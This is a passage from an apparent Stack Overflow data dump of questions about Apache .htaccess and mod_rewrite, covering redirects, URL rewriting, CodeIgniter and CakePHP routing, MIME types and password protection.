[L,E=END:1]\nRewriteRule ^Bob(/.*)?$ Alice$1 [L,E=END:1]\n</code></pre>\n\n<p>...and, it worked!  Here's why:  Inside a .htaccess file, directives associated with various apache modules execute in the <em>module order</em> defined in the main Apache configuration (or, that's my understanding, anyway...).  In this case (and critically for the success of this solution) mod_headers was set to execute after mod_rewrite, so the RequestHeader directive gets executed <em>after</em> the rewrite rules.  That means the the <code>SPECIAL-HEADER-STOP-FURTHER-REWRITES-kjhsdf87653vasj</code> header gets added to the HTTP request iff a RewriteRule with [E=END:1] in its flag list gets matched.  On the next pass (after the re-written request is resubmitted to the server) the first RewriteRule detects this header, and aborts any further rewriting.</p>\n\n<p>Some things to note about this solution are:</p>\n\n<ol>\n<li><p>It won't work if Apache is configured to run mod_headers <em>before</em> mod_rewrite.  (I'm not sure if that's even possible, or if so, how unusual it'd be).</p></li>\n<li><p>If an external user includes a <code>SPECIAL-HEADER-STOP-FURTHER-REWRITES-kjhsdf87653vasj</code> header in their HTTP request to the server, it'll disable <strong>all</strong> URL rewriting rules, and that user will see the filesystem directory structure \"as-is\".  That's the reason for the random string of ascii characters at the end of the header name - it's to make the header hard to guess.  Whether this is a feature or a security vulnerability depends on your point of view!</p></li>\n<li><p>The idea here was a workaround to mimic the use of the [END] flag in Apache versions that don't yet have it.  If all you wanted was to ensure your ruleset only runs once, regardless of which rules are triggered, then you could probably drop the use  of the 'END' environment variable and just do this:</p>\n\n<pre><code>RewriteCond %{HTTP:SPECIAL-HEADER-STOP-FURTHER-REWRITES-kjhsdf87653vasj} =1 [NV]\nRewriteRule .* - [L]\n\nRequestHeader set SPECIAL-HEADER-STOP-FURTHER-REWRITES-kjhsdf87653vasj 1\n\n#  Map /Alice to /Bob, and /Bob to /Alice\nRewriteRule ^Alice(/.*)?$ Bob$1 [L]\nRewriteRule ^Bob(/.*)?$ Alice$1 [L]\n</code></pre>\n\n<p>Or even better, this (though the REDIRECT_* variables are poorly documented in the Apache v2.2 documetation - they seem to be only mentioned <a href=\"http://httpd.apache.org/docs/2.2/custom-error.html\" rel=\"nofollow\">here</a>) - so I can't guarantee it'd work on all versions of Apache):</p>\n\n<pre><code>RewriteCond %{ENV:REDIRECT_STATUS} !^$\nRewriteRule .* - [L]. \n\n#  Map /Alice to /Bob, and /Bob to /Alice\nRewriteRule ^Alice(/.*)?$ Bob$1 [L]\nRewriteRule ^Bob(/.*)?$ Alice$1 [L]\n</code></pre>\n\n<p>However, once you're running Apache v2.3.9+, I expect that using the [END] flag would be more efficient than the above solution, because (presumably) it altogether avoids the rewritten URL being re-submitted to the server for another rewriting pass.</p>\n\n<p>Note that you may also want to block rewriting of subrequests, in which case you can a <code>RewriteCond</code> to the don't-do-any-more-rewriting rule, like this:</p>\n\n<pre><code>RewriteCond %{ENV:REDIRECT_STATUS} !^$ [OR]\nRewriteCond %{IS_SUBREQ} =true\nRewriteRule .* - [L]\n</code></pre></li>\n<li><p>The idea here was a workaround to replace the use of the [END] flag in Apache versions that don't yet have it.  But in fact you can use this general approach to store more than just a single flag - you could store arbitrary strings or numbers that would persist across an internal server redirect, and design your rewrite rules to depend on them based on any of the test conditions RuleCond provides.  (I can't, off the top of my head, think of a reason <em>why</em> you'd want to do that... but hey, the more flexibility and control you have, the better, right?)</p></li>\n</ol>\n\n<hr>\n\n<p><em>I guess anyone who's read this far has figured out that I'm not really asking a question here.  It's more a matter of my having found my own solution to a problem I had, and wanting to post it up here for reference in case anyone else has run into the same problem.  That's a big part of what this webiste is for, right?</em></p>\n\n<p>...</p>\n\n<p>But since this <em>is</em> supposed to be a question-and-answer forum, I'll ask:</p>\n\n<ul>\n<li>Can anyone see any potential problems with this solution (other than those I've already mentioned)?</li>\n<li>Or does anyone have a better way of achieving the same thing?</li>\n</ul>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12341881,"title":"2 RewriteRule in htaccess","body":"<p>I would like to redirect everything to <code>a.php</code>. And <code>baba</code> to <code>b.php</code>.</p>\n\n<p>I did the following:</p>\n\n<p>.htaccess :</p>\n\n<pre><code>RewriteEngine on\n\nRewriteCond %{REQUEST_URI} !a.php\nRewriteCond %{REQUEST_URI} !baba\nRewriteRule .* a.php\n\nRewriteRule baba b.php\n</code></pre>\n\n<p>a.php : <code>&lt;?php echo 'a.php'; ?&gt;</code><br>\nb.php : <code>&lt;?php echo 'b.php'; ?&gt;</code></p>\n\n<p>But baba redirect to a.php too.</p>\n\n<p>So I modified line 4 in htaccess to: <code>RewriteCond %{REQUEST_URI} ^!baba</code></p>\n\n<p>And now baba redirect to b.php but everything else gives a <code>Not found</code> error.</p>\n\n<p>How can I do it?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12332347,"title":"If \"modules/mod_rewrite.so\" is commented out, will show \"Internal Server Error\"","body":"<p>I know if the following code have be commented out</p>\n\n<pre><code>#LoadModule rewrite_module modules/mod_rewrite.so\n</code></pre>\n\n<p>the mod_rewrite will not work</p>\n\n<p>.</p>\n\n<p>And if the \".htaccess\" existed and code include following, </p>\n\n<pre><code>RewriteEngine On\n</code></pre>\n\n<p>the browser will show me \"Internal Server Error\"</p>\n\n<p>.</p>\n\n<p>But I cannot remove or edit httpd.conf or .htaccess</p>\n\n<p>I can just add some rule to .htaccess but cannot change existed rules</p>\n\n<p>.</p>\n\n<p>So, can I make the RewriteEngine \"Off\" when \"modules/mod_rewrite.so\" is commented  out?</p>\n"},{"tags":["php","oop",".htaccess","codeigniter","routes"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12340259,"title":"codeigniter routes issue for main url","body":"<p>I have defined a new route on routes.php but it have problem.</p>\n\n<pre><code>$route['default_controller'] = \"index\";\n$route['404_override'] = '';\n$route['(:any)'] = \"oyna/oyun/$1\";\n</code></pre>\n\n<p>I want to redirect /2012.htm to oyna/oyun/2012.htm and I can but it create a new problem. I can't reach my other controller if I don't define as below:</p>\n\n<pre><code>$route['default_controller'] = \"index\";\n$route['404_override'] = '';\n$route['admin/(:any)/(:any)'] = 'admin/$1/$2';\n$route['admin/(:any)'] = 'admin/$1';\n$route['kategori/(:any)'] = \"oyna/kategori/$1\";\n$route['(:any)'] = \"oyna/oyun/$1\";\n</code></pre>\n\n<p>If i don't define any controllers on routes.php like above I can't reach that.\nWhat i need to do for solve?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","cdn"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12016001,"title":"Need help rewriting static content to my CDN","body":"<p>I'm looking for help rewriting all the static content in one subdir over to my CDN URL. The tricky part is that I'd like this to happen whilest keeping the URL in the browser still showing my main URL. I also need to obviously keep it from rewriting requests from CloudFront to my server as well.</p>\n\n<p>Here's what I have so far that I grabbed off another post when searching for some answers on this. Not sure what the HTTP:Via line is all about:</p>\n\n<pre><code># Rewrite home page to launch countdown timer\nRewriteRule ^$  /get-ready [L]\n\n# Rewrite static stuff to CDN\nRewriteCond %{HTTP:Via}   !\\.s\\.worldcdn\\.com\n# Flash wont work on cross-domain by default\nRewriteCond $1            !^.swf$ [NC]\nRewriteCond $1            \"\\.(jpe?g|gif|png|bmp|ico|js|css|pdf|docx?|xlsx?|ppt|rar|zip|tar|gz|tgz|bz2|flv|avi|mov|wmv|mp3|wav|xml|txt)$\" [NC]\nRewriteRule ^/get-ready/(.*)           http://cdn.domain.com/get-ready/$1 [L]\n</code></pre>\n\n<p>Thanks in advance!</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":12339896,"title":"301 Redirects with dynamic URLs","body":"<p>I am trying to rewrite my .htaccess file to redirect old dynamic URLS to new ones.</p>\n\n<p>I have tried these so far but they are not working as expected. The second rule seems to redirect to the first one.</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_HOST} ^mydomain.com$\nRewriteRule ^(.*)$ \"http\\:\\/\\/www\\.mydomain\\.com\\/$1\" [R=301,L]\n\nRedirect 301 /product.php?l=old-product-name1 http://www.mydomain.com/product.php?l=new-product-name1\nRedirect 301 /product.php?l=old-product-name2 http://www.mydomain.com/product.php?l=new-product-name2\n</code></pre>\n\n<p>Can anyone help me redirect these properly?</p>\n"},{"tags":["php",".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12341041,"title":".htaccess 301 redirect for substring of URI - it's appending the $_GET['variables'] on the end of the URI","body":"<p>I just set up a new site and spelled one of the categories as <code>autimobiles</code> instead of <code>automobiles</code> - I know it's rediculous.  I set up an <code>.htaccess</code> 301 redirect for any URL containing the substring <code>autimobiles</code> to be redirected to <code>automobiles</code>.  So, the URI <code>/autimobiles/BMW-pictures</code> should be redirected to <code>/automobiles/BMW-pictures</code>.  However, this is what is happening...</p>\n\n<p>This</p>\n\n<p><code>http://imageocd.com/autimobiles/hupmobile-touring-pictures-and-wallpapers</code></p>\n\n<p>is redirecting to this</p>\n\n<p><code>http://imageocd.com/automobiles/hupmobile-touring-pictures-and-wallpapers?one=autimobiles&amp;two=hupmobile-touring-pictures-and-wallpapers</code></p>\n\n<p>Here's how I have the <code>.htaccess</code> set up.</p>\n\n<p>I have two <code>$_GET['']</code> variables entitled <code>$_GET['one']</code> &amp;&amp; <code>$_GET['two']</code> for mod rewrite.  Those two variables are being displayed as <code>$_GET['']</code> variables in the URI upon redirection.  I want to remove the <code>?one=autimobiles&amp;two=hupmobile-touring-pictures-and-wallpapers</code> from the URI.</p>\n\n<p>Here's my <code>.htaccess</code>.</p>\n\n<pre><code># Important line HERE\nRedirectMatch permanent autimobiles(.*) http://imageocd/automobiles$1\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([a-zA-Z0-9-]+)/([a-zA-Z0-9-]+) index.php?one=$1&amp;two=$2 [NC,L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([a-zA-Z0-9-]+) index.php?one=$1 [NC,L]\n</code></pre>\n\n<p><strong>Update in <code>.htaccess</code></strong></p>\n\n<pre><code>RewriteCond %{QUERY_STRING} ^autimobiles(.*)$\nRewriteRule ^autimobiles(.*)$ http://imageocd.com/automobiles$1 [R=301,L]\n\n#load-data (2) -- index.php\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([a-zA-Z0-9-]+)/([a-zA-Z0-9-]+) index.php?one=$1&amp;two=$2 [NC,L]\n\n#load-data (1) -- index.php\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([a-zA-Z0-9-]+) index.php?one=$1 [NC,L]\n</code></pre>\n"},{"tags":["css","apache",".htaccess","svg","mime-types"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":153,"score":0,"question_id":12339643,"title":"Issue with MIME types and serving svg: Resource interpreted as Image but transferred with MIME type text/xml","body":"<p>I'm targeting some SVG images with CSS to use as backgrounds on a few elements and having some strange issues. When <a href=\"http://www.thememoirproject.net/tiles/images/frames/frame-2.svg\" rel=\"nofollow\">going directly to the image</a> it works fine, but when using in CSS I get the following error:</p>\n\n<p><code>Resource interpreted as Image but transferred with MIME type text/xml</code></p>\n\n<p>I've added an .htaccess file to the directory that serves the images with the following code, but it didn't help:</p>\n\n<pre><code>AddType image/svg+xml svg\n</code></pre>\n\n<p>Suggestions?</p>\n"},{"tags":["php","apache",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":55,"score":-2,"question_id":12335160,"title":"Website URL: is directing page to a modified index","body":"<p>Sorry for the awkward title. Here's whats going on.. If i go to:</p>\n\n<ul>\n<li>URL.com/ # i see my site perfectly</li>\n<li>URL.com/sagfasgfr # i see my site perfectly (random noise in the url)</li>\n<li>URL.com/sagfas/udsudfsa # i get my index but without my CSS style (random noise in the url + sub with more noise)</li>\n</ul>\n\n<p>I have HTACCESS configured:</p>\n\n<pre><code>ErrorDocument 404 http://URL.com\nErrorDocument 403 http://URL.com\nErrorDocument 500 http://URL.com\n\n&lt;IfModule mod_rewrite.c&gt;\n\n Options +FollowSymlinks\n\n RewriteEngine On\n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>I also want to remove <code>.php</code> but the ReWrite rule I have is not working. <strong>Please advise</strong> By the way this site is a registration form, so ALL pages outside of the home <code>DIR</code> should NOT have direct access.</p>\n\n<p>BTW: BOX IS APACHE, LINUX</p>\n\n<p>rewrite rule for removing .php causes internal server error</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.php -f\nRewriteRule ^(.*)$ $1.php\n</code></pre>\n"},{"tags":[".htaccess","cakephp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":12312499,"title":"Redirection in cake PHP, hide app/webroot bit","body":"<p>I have a site done with cakePHP and I access to the sites there like:</p>\n\n<pre><code>http://example.com/site1\n</code></pre>\n\n<p>Which is converted to:</p>\n\n<pre><code>http://example.com/app/webroot/site1\n</code></pre>\n\n<p>As I've searched and seen <a href=\"http://book.cakephp.org/1.3/view/917/Apache-and-mod_rewrite-and-htaccess\" rel=\"nofollow\">here</a> or searching here in stack-overflow this is the normal behaviour but I'd like that the user actually doesn't see the <strong>app/webroot</strong> bit.</p>\n\n<p>Is that possible?</p>\n\n<p>Here is my current .htaccess:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n   RewriteEngine on\n   RewriteCond %{HTTP_HOST} !^www\\.example\\.com [NC]\n   RewriteCond %{HTTP_HOST} !^$\n   RewriteRule ^/?(.*) http://www.example.com/$1 [R=301,NE,L]\n\n# CakePHP part\n&lt;IfModule mod_rewrite.c&gt;\n   RewriteEngine on\n   RewriteRule    ^$ app/webroot/    [L]\n   RewriteRule    (.*) app/webroot/$1 [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Thank you</p>\n"},{"tags":[".htaccess","cakephp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12329296,"title":"Htaccess and cakephp","body":"<p>I've having a bit of trouble with cakephp and custom htaccess file. </p>\n\n<p>I have a site built in cakePHP. However i'm now trying to complete an admin area to the site and all the admin pages are in another folder, i am then trying to add a htaccess file to this folder. However it fails to work. I've done some htaccess on similar shared servers before, including my own personal one which is the same. I've added the one i'm trying to create onto my person server and works correctly.</p>\n\n<p>So i'm guessing cakePHP is prehaps stopping/overriding this htaccess from running.</p>\n\n<p>Any ideas? <strong>*</strong> is the server name - i have of course got the login/pass correctly in the htpasswd2 </p>\n\n<p>AuthUserFile /home/<strong><em>*</em></strong>/.htpasswds/.htpasswd2\n AuthType Basic\n AuthName \"Hmm. Your not going anywhere without a password!\"\n Require valid-user</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12339069,"title":"use htaccess to show page in folder that doesn't exist","body":"<p>On my website, I have a user profile php file, where if you write <code>http://www.youdomain.com/user.php?id=[user id]</code>, it shows that user's profile with that id. </p>\n\n<p>Is there a way in htaccess that if a write <code>http://www.youdomain.com/users/[user id]</code>, it will display the page <code>http://www.youdomain.com?id=[user id]</code>?</p>\n"},{"tags":["php",".htaccess","configuration"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":12338679,"title":"What is wrong with having a dynamic configuration file in PHP?","body":"<p>I have recently taken to converting my websites files into ones that work on any path. I am working on using Virtual Hosts to be able to maintain the same <code>.htaccess</code> file as on the main production server. My initialize file that includes all my models is written dynamically to find out the exact system file path and update the website accordingly so I can upload the whole website anywhere. </p>\n\n<p>The trouble lies in the config file. Depending on whether I am on dev or on prod, I connect to a differert database. Therefore I have a small check first to see if I am running a local server. I do this by storing my naming conventions for my dev in an array and by looping through the array to see if the HTTP_HOST matches a value. </p>\n\n<p>Example:</p>\n\n<pre><code>$dev_names = array('localhost','.dev');\n</code></pre>\n\n<p>However, when I mentioned this on Chat the other day, <a href=\"http://chat.stackoverflow.com/transcript/message/5281114#5281114\">a respected user told me</a> that he never does this. Instead he has 2 config files and includes the right one at the right time? I didn't get though what was wrong with my approach?</p>\n\n<p>Can you point out to me the flaws in my plan to help me understand the experts? </p>\n\n<p>(PS.  For a bonus you can give me a quick run down on how a bootstrap works, heard that word being thrown around, not sure if it is written in PHP or whatever.)</p>\n"},{"tags":["apache",".htaccess","redirect","dns"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":366,"score":0,"question_id":1052975,"title":"Problems redirecting old domain to new with Apache and htaccess","body":"<p>My homepage is located at www.nazgulled.net and I bought a new domain which is www.ricardoamaral.net. Both these domains point to the same exact server.</p>\n\n<p>I'm having two problems with the redirection, my current code is this:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^(www\\.)?nazgulled\\.net [NC]\nRewriteRule ^(.*)$ http://www.ricardoamaral.net/$1 [L]\n</code></pre>\n\n<p>For now I'm just testing but the idea is to replace [L] with [L,R=301] when I'm ready to move the whole thing, just so you know.</p>\n\n<p>Anyway...</p>\n\n<p><strong>1)</strong> This is not working, when I try it, I can't access \"nazgulled.net\", it gives me a \"server internal error\" and I don't understand why... I don't understand why because if replace \"ricardoamaral.net\" by \"google.com\", the redirect works just fine :/</p>\n\n<p><strong>2)</strong> I have a few subdomains and I would like to redirect everything in those too. My first choice is to add different rewrite conditions/rules for each of the subdomains but that takes a lot of manual code and if the user types some subdomain that doesn't exist, they don't be redirect it and I also want that.</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12337850,"title":"htaccess: why final page has GET parameters from start redirect page?","body":"<p>I have this rule:</p>\n\n<pre><code>RewriteCond %{QUERY_STRING} someGetParameter=1\nRewriteRule ^someoldpage.php$ http://newdomain.ru/page/ [L,R=301]\n</code></pre>\n\n<p>After redirect I get </p>\n\n<pre><code>http://newdomain.ru/page/?someGetParameter=1\n</code></pre>\n\n<p>instead of </p>\n\n<pre><code>http://newdomain.ru/page/\n</code></pre>\n\n<p>Why it is going wrong?</p>\n"},{"tags":["php","apache",".htaccess","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12331074,"title":"Cannot remove index.php using htaccess","body":"<p>When I try to remove index.php\nand access controller: mysite.com/admin\nI keep getting Internal Server Error.\nI have no idea why it doesn't work.</p>\n\n<p>.htaccess</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /code/\n\nRewriteCond %{REQUEST_URI} ^system.*\nRewriteRule ^(.*)$ index.php?/$1 [L]\n\nRewriteCond %{REQUEST_URI} ^application.*\nRewriteRule ^(.*)$ index.php?/$1 [L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L]\n&lt;/IfModule&gt; \n</code></pre>\n\n<p>Site config</p>\n\n<pre><code>&lt;Directory /home/mysite.com/public_html/&gt;\nOptions Indexes Includes FollowSymLinks MultiViews\nAllowOverride AuthConfig FileInfo\nOrder allow,deny\nAllow from all\n&lt;/Directory&gt; \n</code></pre>\n\n<p>Apache error log</p>\n\n<pre><code>[Sat Sep 08 15:24:30 2012] [error] [client 176.106.162.240] \nRequest exceeded the limit of 10 internal redirects \ndue to probable configuration error. Use 'LimitInternalRecursion' \nto increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.\n</code></pre>\n"},{"tags":["wordpress",".htaccess","rewrite","slim","mod"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12334311,"title":"issues with Mod Rewrite with folders inside wordpress page","body":"<p>I'm working on a client app and im using the Slim framework.\nthe root of the site is a wordpress page </p>\n\n<p>and my app stuff is under\n<a href=\"http://example.com/yumninja_app_1_0/api/\" rel=\"nofollow\">http://example.com/yumninja_app_1_0/api/</a></p>\n\n<p>when you go to the url, it returns a 404, but the 404 is from the wordpress page. </p>\n\n<p>the htaccess file on the root is:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\n RewriteBase /\n RewriteRule ^index\\.php$ - [L]\n RewriteCond %{REQUEST_FILENAME} !-f\n RewriteCond %{REQUEST_FILENAME} !-d\n RewriteRule . /index.php [L]\n &lt;/IfModule&gt;\n</code></pre>\n\n<p>and the htaccess inside my folder (yumninja_app_1_0/api/) is</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)$ index.php [QSA,L]\n</code></pre>\n\n<p>My question is how to exclude a folder from mod_rewrite?</p>\n"},{"tags":["php","html",".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12335700,"title":"Difference between .php extension and AddType","body":"<p>Since I want to have PHP code run properly on my website, should I add</p>\n\n<p><code>AddType application/x-httpd-php .html</code></p>\n\n<p>to my htaccess file, or just change all of my <code>*.html</code> files into <code>*.php</code> files?</p>\n\n<p>I've heard that changing the file extension to <code>*.php</code> causes the website to load slower, but I'm wondering if changing the htaccess file does the same.</p>\n"},{"tags":["php",".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1213,"score":0,"question_id":8652933,"title":"How to disable notice and warning in PHP within .htaccess file?","body":"<p>I just want to only turn on php errors and disable all notice and warnings in php files.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":12333525,"title":".htaccess rewrite keeps going after a match is made","body":"<p>I'll preface this with the fact that htaccess and mod_rewrite aren't my best areas. I've written a php MVC framework for personal use, and in the document root I have a folder called \"public\" for css, js, images, etc. Every HTTP request is checked against the files in \"public\" and if it exists, it sends that file; otherwise it redirects to index.php for the framework.</p>\n\n<p>The rules work, but if a match is made in \"public,\" it still routes to index.php. If I comment out the last line which redirects to index.php, the css and js load properly. I can't get it to stop processing after the \"public\" match is made.</p>\n\n<p>Thanks in advance</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\n\n#If file exists as public resource\nRewriteCond %{DOCUMENT_ROOT}/public/$1 -f\nRewriteRule ^(.*) %{DOCUMENT_ROOT}/public/$1 [NC,L]\n\n\n#Redirect everything else to index.php\nRewriteRule ^(.*) index.php [NC,L]\n</code></pre>\n"},{"tags":["php",".htaccess","mod-rewrite","rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":28,"score":-1,"question_id":12333880,"title":"Redirect requests (htaccess)","body":"<p>I have this rule:</p>\n\n<pre><code>RewriteCond %{HTTP_REFERER} !^http://(.+\\.)?site\\.com/ [NC]\nRewriteRule .*\\.(gif)$ gif.php [L]\n</code></pre>\n\n<p>As i know, its redirecting ALL requests to *.gif files. How i must to edit this rule to redirect requests only /uploads/ folder?</p>\n\n<p>Sorry for my English (:</p>\n"},{"tags":["php",".htaccess","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12331160,"title":"codeigniter .htaccess url issue","body":"<p>I want to do this: (firstly, ci is my codeigniter folder)<br/>If user call ci/2012.htm I want to redirect ci/oyna/oyun/2012.htm I'm trying to use this but It's not running.</p>\n\n<pre><code>    RewriteEngine on\n    RewriteCond $1 !^(index\\.php|resources|robots\\.txt)\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php/$1 [L,QSA]\n    RewriteRule ^(.*)$ index.php/oyna/oyun/$1 [L,QSA]\n</code></pre>\n\n<p>When I call ci/2012.htm it returns codeigniter 404 not found page.</p>\n"},{"tags":[".htaccess","redirect","jquery-tools","jquery-jscrollpane"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12323634,"title":"Redirect root to page for jquery tabs","body":"<p>I've got a site using jQuery Tools tabs and Ajax. It works fine if you start out at the home page:</p>\n\n<p><a href=\"http://bdbcreative.com/home.htm\" rel=\"nofollow\">http://bdbcreative.com/home.htm</a></p>\n\n<p>Click on any of the tabs and you get the extended Ajax address, which is what client wants and seems to be necessary for jScrollPane to work (http://bdbcreative.com/home.htm#web-design.htm).</p>\n\n<p>But if someone just enters the domain - <a href=\"http://bdbcreative.com\" rel=\"nofollow\">http://bdbcreative.com</a> - \"home.htm\" never gets written and I end up with a URL like <a href=\"http://bdbcreative.com/#web-design.htm\" rel=\"nofollow\">http://bdbcreative.com/#web-design.htm</a>, which breaks jScrollPane.</p>\n\n<p>I'm thinking I can use .htaccess to fix this, but I can't figure out the syntax. Can someone point me in the right direction. For consistency's sake, I'd like to have any site root URLs (http://bdbcreative.com or http:www.bdbcreative.com/ etc.) redirect to the home.htm address (i.e., <a href=\"http://bdbcreative.com/home.htm\" rel=\"nofollow\">http://bdbcreative.com/home.htm</a>)</p>\n\n<p>Thanks - Joe</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12329737,"title":"Mod Rewrite URL and always redirect to new url","body":"<p>htaccess on apache</p>\n\n<p>I have this url:</p>\n\n<p><strong>mydomain.com/old.html</strong></p>\n\n<p>I want it to be rewritten as:</p>\n\n<p><strong>mydomain.com/new.html</strong></p>\n\n<p>But I also want <strong>mydomain.com/old.html</strong> to always redirect to <strong>mydomain.com/new.html</strong>.</p>\n\n<p>I tried the following:</p>\n\n<pre><code>RewriteRule ^/new.html /old.html [R=301,L,PT] \n</code></pre>\n\n<p>But it doesn't work.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":12330880,"title":"I can't get my rewrite rule to work properly","body":"<p>I'm trying to make this:</p>\n\n<pre><code>www.amazingjokes.com/cache/search.php?term=programming\n</code></pre>\n\n<p>to go to this:</p>\n\n<pre><code>wwww.amazingjokes.com/popular/programming\n</code></pre>\n\n<p>But I can not get it to work properly. I tried stuff like</p>\n\n<pre><code>RewriteRule ^cache/search.php?term=(.*)$ /popular/$1 [R=301,L]\n</code></pre>\n\n<p>but to no avail.. help would be greatly appreciated!</p>\n"},{"tags":["flash",".htaccess","ssl","swf"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12330847,"title":"Flash object makes insecure http request","body":"<p>We have a flash object that was made years ago, it makes http request to our server to get data. But since we started using SSL cert. it breaks secure connection when flash object loaded in a page.</p>\n\n<p>I created .htaccess file in the folder that flash object makes request to\nI put these in it</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTPS} !on\nRewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI}\n</code></pre>\n\n<p>But it seems it doesn't work. It still breaks the secure page when flash object is loaded. </p>\n\n<p>Is there any way to solve this problem other than changing swf file ?</p>\n"},{"tags":["apache",".htaccess","website","subdirectory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":11383573,"title":"Making a Subdirectory Independent Using the .htaccess File","body":"<p>Let's say that I have a subdirectory in my <code>www</code> folder called <code>subdirectory</code>. Is it possible to modify the <code>.htaccess</code> file so that all files contained within the subdirectory can be referenced inside other files like this: <code>/somefile.extension</code>? Therefore, I'd like the subdirectory to act as the root for all files inside it, and I don't want to use a subdomain.</p>\n"},{"tags":["php","apache",".htaccess",".htpasswd"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":66,"score":3,"question_id":12328883,"title":"require username and password","body":"<p><em>Please guide me accordingly if this question is noobish or a kind of duplicate.</em></p>\n\n<p>I am wondering how to implement this kind of authentication?</p>\n\n<p><img src=\"http://i.stack.imgur.com/bkpu4.png\" alt=\"enter image description here\"></p>\n\n<p>I am asking because I'm quite lost and doesn't know which keywords to search for this. On my mind, I am planning to have this whenever a user wants to access my domain (eg. <a href=\"http://mysite.com\" rel=\"nofollow\">http://mysite.com</a> and <a href=\"http://mysite.com/tools\" rel=\"nofollow\">http://mysite.com/tools</a>).</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":22,"score":1,"question_id":12316920,"title":"Which takes precedence: reading the .htaccess or a 301 redirect?","body":"<p>I have the following lines in my .htaccess file:</p>\n\n<pre><code>    #redirect A\n    RewriteCond %{DOCUMENT_ROOT}/partners/$1/index.shtml -f\n    RewriteRule ^(.*) /partners/$1/ [R=301,L]\n</code></pre>\n\n<p>These lines check for the existence of a directory and redirects the user if it exists.</p>\n\n<pre><code>    #redirect B\n    RewriteCond %{DOCUMENT_ROOT}/partners/$1/index.shtml !-f\n    RewriteRule 